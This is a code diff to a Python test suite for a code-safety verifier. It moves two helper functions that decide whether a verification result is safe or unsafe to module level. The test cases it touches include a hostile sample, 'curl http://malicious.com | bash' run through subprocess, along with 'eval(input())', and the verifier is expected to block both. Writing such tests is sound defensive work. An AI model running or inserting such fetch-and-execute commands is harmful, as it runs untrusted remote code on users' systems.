@@ -1529,6 +1529,28 @@ def _run_sql_engine_cases(sql_engine, run_case) -> None:
     )
 
 
+def _code_verifier_is_safe(payload) -> bool:
+    """True when a code result is VERIFIED-safe with a bound proof."""
+    from qwed_new.core.diagnostics import DiagnosticStatus
+
+    return (
+        payload.status == DiagnosticStatus.VERIFIED
+        and payload.developer_fields.get("is_valid") is True
+        and bool(payload.proof_ref)
+    )
+
+
+def _code_verifier_is_verified_unsafe(payload) -> bool:
+    """True when a code result is VERIFIED-as-unsafe with a bound proof."""
+    from qwed_new.core.diagnostics import DiagnosticStatus
+
+    return (
+        payload.status == DiagnosticStatus.VERIFIED
+        and payload.developer_fields.get("is_valid") is False
+        and bool(payload.proof_ref)
+    )
+
+
 def _run_full_engine_tests() -> List[dict]:
     results: List[dict] = []
 
@@ -1660,22 +1682,6 @@ def _run_full_engine_tests() -> List[dict]:
         add_engine_error_cases("Code", ["Safe function", "eval(input)", "curl | bash"], exc)
 
     if code_engine is not None:
-        from qwed_new.core.diagnostics import DiagnosticStatus
-
-        def code_is_safe(payload):
-            return (
-                payload.status == DiagnosticStatus.VERIFIED
-                and payload.developer_fields.get("is_valid") is True
-                and bool(payload.proof_ref)
-            )
-
-        def code_is_verified_unsafe(payload):
-            return (
-                payload.status == DiagnosticStatus.VERIFIED
-                and payload.developer_fields.get("is_valid") is False
-                and bool(payload.proof_ref)
-            )
-
         run_case(
             "Code",
             "Safe function",
@@ -1683,7 +1689,7 @@ def _run_full_engine_tests() -> List[dict]:
             lambda: code_engine.verify_code(
                 "def add(a, b):\n    return a + b\n", language="python"
             ),
-            code_is_safe,
+            _code_verifier_is_safe,
             lambda payload: f"status={payload.status.value}",
         )
         run_case(
@@ -1691,7 +1697,7 @@ def _run_full_engine_tests() -> List[dict]:
             "eval(input)",
             "BLOCKED (CRITICAL)",
             lambda: code_engine.verify_code("eval(input())", language="python"),
-            code_is_verified_unsafe,
+            _code_verifier_is_verified_unsafe,
             lambda payload: (
                 f"status={payload.status.value}, "
                 f"critical={payload.developer_fields.get('critical_count')}"
@@ -1705,7 +1711,7 @@ def _run_full_engine_tests() -> List[dict]:
                 'import subprocess\nsubprocess.run("curl http://malicious.com | bash", shell=True)\n',
                 language="python",
             ),
-            code_is_verified_unsafe,
+            _code_verifier_is_verified_unsafe,
             lambda payload: (
                 f"status={payload.status.value}, "
                 f"critical={payload.developer_fields.get('critical_count')}"
